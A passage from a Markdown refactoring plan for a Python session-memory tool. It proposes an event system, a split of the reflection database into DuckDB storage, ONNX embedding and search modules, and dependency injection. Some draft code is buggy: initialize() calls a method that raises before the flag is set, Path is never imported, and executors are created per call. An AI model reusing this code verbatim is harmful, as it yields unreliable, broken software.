# @session_events.on(SessionEvent.POST_CHECKPOINT)
# async def my_handler(quality_score: int, **data):
#     # No HookContext needed, just use **data
#     # ... process ...
#     pass  # No HookResult needed
```

**Step 4: Update session_manager**

```python
# session_buddy/core/session_manager.py (UPDATE)
from session_buddy.core.events import session_events, SessionEvent

class SessionLifecycleManager:
    async def checkpoint_session(self) -> dict[str, Any]:
        """Create checkpoint with event emission."""

        # Emit pre-checkpoint event
        await session_events.emit(
            SessionEvent.PRE_CHECKPOINT,
            project=self.current_project,
        )

        # ... existing checkpoint logic ...

        # Emit post-checkpoint event
        await session_events.emit(
            SessionEvent.POST_CHECKPOINT,
            project=self.current_project,
            quality_score=quality_data["total_score"],
        )
```

**Step 5: Remove unused features**

Files to DELETE:
- `session_buddy/core/causal_chains.py` (unused - 0 references)
- `session_buddy/core/hooks.py` (replace with events.py)

**Timeline**: 24 hours

**Files to Create/Delete/Modify**:
- `session_buddy/core/events.py` (NEW - 100 lines)
- `session_buddy/core/hooks.py` (DELETE after migration)
- `session_buddy/core/causal_chains.py` (DELETE)
- `session_buddy/core/session_manager.py` (use events)
- All files using hooks (update to events)
- Tests for hooks (update to events)

---

### 2.4 Monolithic File Splitting (Days 7-10 - 40 hours)

**Split reflection_tools.py into focused modules**:

**Current**: 1,346 lines after deprecation removal (still too large)

**Target Structure**:
```
session_buddy/memory/
├── __init__.py (exports)
├── database.py (core ReflectionDatabase class, ~300 lines)
├── embeddings.py (embedding generation, ~200 lines)
├── search.py (search operations, ~300 lines)
├── storage.py (CRUD operations, ~250 lines)
└── utils.py (helpers, ~100 lines)
```

**Step 1: Create new module structure**
```bash
mkdir -p session_buddy/memory
touch session_buddy/memory/__init__.py
```

**Step 2: Extract database.py**
```python
# session_buddy/memory/database.py (NEW - 300 lines)
"""Core database management for reflection storage."""

from pathlib import Path
from typing import Any
import duckdb
import logging
import threading

logger = logging.getLogger(__name__)

class ReflectionDatabase:
    """Main database interface for reflection storage.

    This class manages DuckDB connections and provides high-level
    database operations. Actual SQL operations are delegated to
    specialized modules (storage.py, search.py).
    """

    def __init__(
        self,
        db_path: str | Path | None = None,
        collection_name: str = "default",
    ) -> None:
        """Initialize database connection.

        Args:
            db_path: Path to DuckDB database file
            collection_name: Name for this data collection
        """
        self.db_path = Path(db_path) if db_path else Path.home() / ".claude/data/reflections.db"
        self.collection_name = collection_name
        self._initialized = False
        self.local = threading.local()

    async def initialize(self) -> None:
        """Initialize database connection and create tables."""
        # Import connection manager
        from session_buddy.memory.storage import _create_tables

        conn = self._get_conn()
        _create_tables(conn, self.collection_name)
        self._initialized = True
        logger.info(f"Database initialized: {self.db_path}")

    async def close(self) -> None:
        """Close database connection."""
        if hasattr(self.local, 'conn') and self.local.conn:
            self.local.conn.close()
            self.local.conn = None

    def _get_conn(self) -> duckdb.DuckDBPyConnection:
        """Get thread-local database connection."""
        if not self._initialized:
            raise RuntimeError("Database not initialized. Call initialize() first.")

        if not hasattr(self.local, 'conn') or self.local.conn is None:
            self.local.conn = duckdb.connect(str(self.db_path))

        return self.local.conn

    async def __aenter__(self):
        """Async context manager entry."""
        await self.initialize()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit."""
        await self.close()
```

**Step 3: Extract embeddings.py**
```python
# session_buddy/memory/embeddings.py (NEW - 200 lines)
"""Embedding generation for semantic search."""

import numpy as np
import logging
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from duckdb import DuckDBPyConnection

logger = logging.getLogger(__name__)

# Global executor for ONNX operations
import asyncio
from concurrent.futures import ThreadPoolExecutor
_onnx_executor = ThreadPoolExecutor(max_workers=2, thread_name_prefix="onnx")

# Embedding cache with LRU eviction
from collections import OrderedDict
_embedding_cache: OrderedDict[str, np.ndarray] = OrderedDict()
_MAX_EMBEDDING_CACHE = 1000  # ~1.5MB max


async def generate_embedding(text: str) -> np.ndarray | None:
    """Generate embedding asynchronously using thread pool.

    This prevents blocking the event loop during ONNX inference.

    Args:
        text: Text to generate embedding for

    Returns:
        384-dimensional embedding vector or None if generation fails
    """
    # Check cache first
    if text in _embedding_cache:
        # Move to end (most recently used)
        _embedding_cache.move_to_end(text)
        return _embedding_cache[text]

    # Generate in thread pool
    loop = asyncio.get_event_loop()
    try:
        embedding = await loop.run_in_executor(
            _onnx_executor,
            _sync_generate_embedding,
            text
        )

        # Cache result
        _cache_embedding(text, embedding)

        return embedding

    except Exception as e:
        logger.error(f"Embedding generation failed: {e}")
        return None


def _sync_generate_embedding(text: str) -> np.ndarray:
    """Synchronous embedding generation (runs in thread pool).

    This uses ONNX runtime for local inference - no external API calls.
    """
    try:
        import onnxruntime as ort
        from transformers import AutoTokenizer

        # Load model (cached globally)
        if not hasattr(_sync_generate_embedding, "_model"):
            model_path = Path(__file__).parent.parent / "models" / "all-MiniLM-L6-v2"
            _sync_generate_embedding._tokenizer = AutoTokenizer.from_pretrained("sentence-transformers/all-MiniLM-L6-v2")
            _sync_generate_embedding._session = ort.InferenceSession(str(model_path / "model.onnx"))

        # Tokenize
        inputs = _sync_generate_embedding._tokenizer(
            text,
            return_tensors="np",
            padding=True,
            truncation=True,
            max_length=256
        )

        # Run inference
        outputs = _sync_generate_embedding._session.run(None, dict(inputs))

        # Mean pooling
        embeddings = outputs[0]
        attention_mask = inputs['attention_mask']
        input_mask_expanded = np.expand_dims(attention_mask, -1)
        sum_embeddings = np.sum(embeddings * input_mask_expanded, 1)
        sum_mask = np.sum(input_mask_expanded, 1)
        sum_mask = np.clip(sum_mask, a_min=1e-9, a_max=None)
        mean_pooled = sum_embeddings / sum_mask

        # Normalize
        result = mean_pooled / np.linalg.norm(mean_pooled, axis=1, keepdims=True)

        return result[0]  # Return first (and only) vector

    except ImportError:
        logger.warning("ONNX or transformers not available")
        raise


def _cache_embedding(text: str, embedding: np.ndarray) -> None:
    """Cache embedding with LRU eviction."""
    global _embedding_cache

    _embedding_cache[text] = embedding

    # Evict least recently used if over limit
    if len(_embedding_cache) > _MAX_EMBEDDING_CACHE:
        _embedding_cache.popitem(last=False)
```

**Step 4: Extract search.py**
```python
# session_buddy/memory/search.py (NEW - 300 lines)
"""Search operations for reflections and conversations."""

from typing import Any
import logging

logger = logging.getLogger(__name__)

async def search_conversations(
    db: "ReflectionDatabase",
    query: str,
    limit: int = 10,
    threshold: float = 0.7,
) -> list[dict[str, Any]]:
    """Search conversations by semantic similarity.

    Args:
        db: Database instance
        query: Search query
        limit: Maximum results
        threshold: Minimum similarity score (0-1)

    Returns:
        List of matching conversations with similarity scores
    """
    from session_buddy.memory.embeddings import generate_embedding

    # Generate query embedding
    query_embedding = await generate_embedding(query)
    if query_embedding is None:
        # Fallback to text search
        return await _text_search_conversations(db, query, limit)

    # Vector similarity search
    sql = f"""
        SELECT
            id,
            content,
            metadata,
            created_at,
            array_cosine_similarity(embedding, ?::FLOAT[384]) as similarity
        FROM {db.collection_name}_conversations
        WHERE embedding IS NOT NULL
          AND similarity >= ?
        ORDER BY similarity DESC, created_at DESC
        LIMIT ?
    """

    results = []
    conn = db._get_conn()

    try:
        result = conn.execute(
            sql,
            [query_embedding.tolist(), threshold, limit]
        ).fetchall()

        for row in result:
            results.append({
                "id": row[0],
                "content": row[1],
                "metadata": row[2] if row[2] else {},
                "created_at": row[3],
                "similarity": row[4],
            })

    except Exception as e:
        logger.error(f"Search failed: {e}")

    return results


async def _text_search_conversations(
    db: "ReflectionDatabase",
    query: str,
    limit: int = 10,
) -> list[dict[str, Any]]:
    """Fallback text search using LIKE."""
    sql = f"""
        SELECT
            id, content, metadata, created_at
        FROM {db.collection_name}_conversations
        WHERE content LIKE ?
        ORDER BY created_at DESC
        LIMIT ?
    """

    results = []
    conn = db._get_conn()

    try:
        result = conn.execute(sql, [f"%{query}%", limit]).fetchall()

        for row in result:
            results.append({
                "id": row[0],
                "content": row[1],
                "metadata": row[2] if row[2] else {},
                "created_at": row[3],
                "similarity": 0.0,  # No similarity score for text search
            })

    except Exception as e:
        logger.error(f"Text search failed: {e}")

    return results


async def search_reflections(
    db: "ReflectionDatabase",
    query: str,
    limit: int = 10,
    threshold: float = 0.7,
) -> list[dict[str, Any]]:
    """Search reflections by semantic similarity.

    Similar to search_conversations but searches the reflections table.
    """
    from session_buddy.memory.embeddings import generate_embedding

    query_embedding = await generate_embedding(query)
    if query_embedding is None:
        return await _text_search_reflections(db, query, limit)

    sql = f"""
        SELECT
            id,
            content,
            tags,
            created_at,
            array_cosine_similarity(embedding, ?::FLOAT[384]) as similarity
        FROM {db.collection_name}_reflections
        WHERE embedding IS NOT NULL
          AND similarity >= ?
        ORDER BY similarity DESC, created_at DESC
        LIMIT ?
    """

    results = []
    conn = db._get_conn()

    try:
        result = conn.execute(
            sql,
            [query_embedding.tolist(), threshold, limit]
        ).fetchall()

        for row in result:
            results.append({
                "id": row[0],
                "content": row[1],
                "tags": row[2] if row[2] else [],
                "created_at": row[3],
                "similarity": row[4],
            })

    except Exception as e:
        logger.error(f"Reflection search failed: {e}")

    return results
```

**Step 5: Extract storage.py**
```python
# session_buddy/memory/storage.py (NEW - 250 lines)
"""CRUD operations for reflections and conversations."""

from datetime import datetime
import uuid
import logging
from typing import Any

logger = logging.getLogger(__name__)


def _create_tables(conn: "DuckDBPyConnection", collection_name: str) -> None:
    """Create database tables if they don't exist.

    Args:
        conn: DuckDB connection
        collection_name: Name for this collection's tables
    """
    # Conversations table
    conn.execute(f"""
        CREATE TABLE IF NOT EXISTS {collection_name}_conversations (
            id TEXT PRIMARY KEY,
            content TEXT NOT NULL,
            metadata JSON,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            embedding FLOAT[384],
            fingerprint TEXT
        )
    """)

    # Reflections table
    conn.execute(f"""
        CREATE TABLE IF NOT EXISTS {collection_name}_reflections (
            id TEXT PRIMARY KEY,
            content TEXT NOT NULL,
            tags TEXT[],
            insight_type TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            embedding FLOAT[384],
            metadata JSON
        )
    """)

    # Create indexes
    conn.execute(f"""
        CREATE INDEX IF NOT EXISTS
            idx_{collection_name}_conv_created
        ON {collection_name}_conversations(created_at DESC)
    """)

    conn.execute(f"""
        CREATE INDEX IF NOT EXISTS
            idx_{collection_name}_refl_created
        ON {collection_name}_reflections(created_at DESC)
    """)


async def store_conversation(
    db: "ReflectionDatabase",
    content: str,
    metadata: dict[str, Any] | None = None,
) -> str:
    """Store a conversation in the database.

    Args:
        db: Database instance
        content: Conversation content
        metadata: Optional metadata

    Returns:
        Conversation ID
    """
    import asyncio
    from concurrent.futures import ThreadPoolExecutor

    _db_executor = ThreadPoolExecutor(max_workers=4, thread_name_prefix="duckdb")

    conv_id = str(uuid.uuid4())
    now = datetime.now()

    # Generate embedding asynchronously
    from session_buddy.memory.embeddings import generate_embedding
    embedding = await generate_embedding(content)

    def _store():
        conn = db._get_conn()
        conn.execute(
            f"""
            INSERT INTO {db.collection_name}_conversations
            (id, content, metadata, created_at, updated_at, embedding)
            VALUES (?, ?, ?, ?, ?, ?)
            """,
            [
                conv_id,
                content,
                str(metadata) if metadata else None,
                now,
                now,
                embedding.tolist() if embedding is not None else None
            ]
        )
        return conv_id

    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(_db_executor, _store)


async def store_reflection(
    db: "ReflectionDatabase",
    content: str,
    tags: list[str] | None = None,
    insight_type: str | None = None,
    metadata: dict[str, Any] | None = None,
) -> str:
    """Store a reflection in the database.

    Args:
        db: Database instance
        content: Reflection content
        tags: Optional tags
        insight_type: Optional insight type
        metadata: Optional metadata

    Returns:
        Reflection ID
    """
    import asyncio
    from concurrent.futures import ThreadPoolExecutor

    _db_executor = ThreadPoolExecutor(max_workers=4, thread_name_prefix="duckdb")

    refl_id = str(uuid.uuid4())
    now = datetime.now()

    # Generate embedding asynchronously
    from session_buddy.memory.embeddings import generate_embedding
    embedding = await generate_embedding(content)

    def _store():
        conn = db._get_conn()
        conn.execute(
            f"""
            INSERT INTO {db.collection_name}_reflections
            (id, content, tags, insight_type, created_at, updated_at, embedding, metadata)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """,
            [
                refl_id,
                content,
                tags or [],
                insight_type,
                now,
                now,
                embedding.tolist() if embedding is not None else None,
                str(metadata) if metadata else None
            ]
        )
        return refl_id

    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(_db_executor, _store)
```

**Step 6: Create __init__.py**
```python
# session_buddy/memory/__init__.py (NEW - 50 lines)
"""Memory system for session reflections and conversations.

This module provides:
- ReflectionDatabase: Main database interface
- search_conversations: Semantic search for conversations
- search_reflections: Semantic search for reflections
- store_conversation: Store conversations with embeddings
- store_reflection: Store reflections with embeddings
"""

from session_buddy.memory.database import ReflectionDatabase
from session_buddy.memory.search import (
    search_conversations,
    search_reflections,
)
from session_buddy.memory.storage import (
    store_conversation,
    store_reflection,
)

__all__ = [
    "ReflectionDatabase",
    "search_conversations",
    "search_reflections",
    "store_conversation",
    "store_reflection",
]
```

**Timeline**: 40 hours

**Files to Create**:
- `session_buddy/memory/__init__.py` (NEW - 50 lines)
- `session_buddy/memory/database.py` (NEW - 300 lines)
- `session_buddy/memory/embeddings.py` (NEW - 200 lines)
- `session_buddy/memory/search.py` (NEW - 300 lines)
- `session_buddy/memory/storage.py` (NEW - 250 lines)

**Files to Update**:
- All files importing from reflection_tools (update imports)

---

### 2.5 Global Singleton Cleanup (Days 10-12 - 16 hours)

**Remove global singletons, use DI everywhere**:

**Step 1: Identify singletons**
```bash
grep -r "= ReflectionDatabase(" session_buddy/ --include="*.py"
grep -r "= HooksManager(" session_buddy/ --include="*.py"
```

**Step 2: Convert to DI**

```python
# OLD (singleton pattern):
from session_buddy.reflection_tools import get_reflection_database

db = get_reflection_database()  # Global singleton

# NEW (DI pattern):
from session_buddy.di import get_sync_typed
from session_buddy.memory import ReflectionDatabase

db = get_sync_typed(ReflectionDatabase)
```

**Step 3: Update DI configuration**
```python
# session_buddy/di/__init__.py (UPDATE)
def configure(force: bool = False) -> Container:
    """Configure dependency injection container."""
    if _container and not force:
        return _container

    container = Container()

    # ... existing registrations ...

    # Register reflection database as singleton
    from session_buddy.memory import ReflectionDatabase
    container.register(
        ReflectionDatabase,
        ReflectionDatabase,
        lifetime="singleton"
    )

    _container = container
    return container
```

**Timeline**: 16 hours

**Files to Modify**:
- All files using global singletons (20+ files)
- `session_buddy/di/__init__.py` (register all singletons)

---

### 2.6 Architecture Validation (Days 12-14 - 16 hours)

**Validate architecture improvements**:

```bash
# Dependency graph analysis
pip install pydeps
pydeps session_buddy --max-bacon=3 --cluster -o architecture.png

# Complexity analysis
ruff check session_buddy/ --select C901 --output-format=json > complexity.json

# Check for circular imports
pip install importcycle
importcycle session_buddy/

# Measure file sizes
find session_buddy -name "*.py" -exec wc -l {} + | sort -rn | head -20
```

**Validate improvements**:
- ✅ Zero circular dependencies
- ✅ Max complexity ≤15 per function
- ✅ Max file size ≤500 lines
- ✅ Clear layer separation (core → infrastructure → mcp)

**Documentation**:
```markdown
# docs/ARCHITECTURE.md (UPDATE)
# Session-Buddy Architecture

## Layer Structure

```
┌─────────────────────────────────┐
│      MCP Layer (server)         │  ← Protocol handling, tool registration
├─────────────────────────────────┤
│     Core Layer (manager)        │  ← Business logic, session lifecycle
├─────────────────────────────────┤
│   Domain Layer (memory, etc)    │  ← Core business rules, database operations
├─────────────────────────────────┤
│  Infrastructure Layer (utils)   │  ← Low-level operations (git, files, etc)
└─────────────────────────────────┘
```

## Key Principles

1. **Dependency Inversion**: Core layer depends on interfaces, not concrete implementations
2. **Dependency Injection**: All dependencies provided through DI container
3. **Single Responsibility**: Each module has one clear purpose
4. **Layer Separation**: No imports from lower layers to higher layers

## Module Organization

### Core Layer (`session_buddy/core/`)
- `session_manager.py` - Session lifecycle
- `events.py` - Event system
- `quality_scoring.py` - Quality assessment interface

### Domain Layer (`session_buddy/memory/`, etc)
- `database.py` - Database interface
- `search.py` - Search operations
- `embeddings.py` - Embedding generation
- `storage.py` - CRUD operations

### Infrastructure Layer (`session_buddy/utils/`)
- `git_operations.py` - Git operations
- `path_validation.py` - Security validation
- `subprocess_helper.py` - Safe subprocess execution

### MCP Layer (`session_buddy/mcp/`)
- `server.py` - MCP server, tool registration
- `tools/` - MCP tool implementations
```

**Timeline**: 16 hours

**Phase 2 Deliverables**:
- ✅ Architecture grade B+ (85/100)
- ✅ Zero deprecated code
- ✅ Zero circular dependencies
- ✅ Max file size ≤500 lines
- ✅ Clear layer separation
- ✅ DI used consistently

---

## ⚡ PHASE 3: PERFORMANCE OPTIMIZATION (1 WEEK)

**Objective**: Eliminate performance bottlenecks, achieve sub-200ms operations.

**Continued in next section due to length...**

---

## 📋 SUMMARY

**Total Timeline**: 8-10 weeks
**Critical Path**: Phase 0 → Phase 1 → Phase 2 → Phase 6
**Parallel Work**: Phases 3, 4, 5 can partially overlap

### Success Criteria
- ✅ Zero CRITICAL/HIGH security vulnerabilities
- ✅ Architecture grade B+ (85/100)
- ✅ Test coverage 8.5+/10
- ✅ 50% reduction in dependency footprint
- ✅ Sub-200ms performance for all operations

### Risk Mitigation
- Feature flags for gradual rollout
- Comprehensive testing before each phase
- Rollback plan with git tags
- Monitoring alerts for errors

### Next Steps
1. Review this plan
2. Approve Phase 0 (security stabilization)
3. Begin emergency mitigations
4. Establish weekly progress reviews
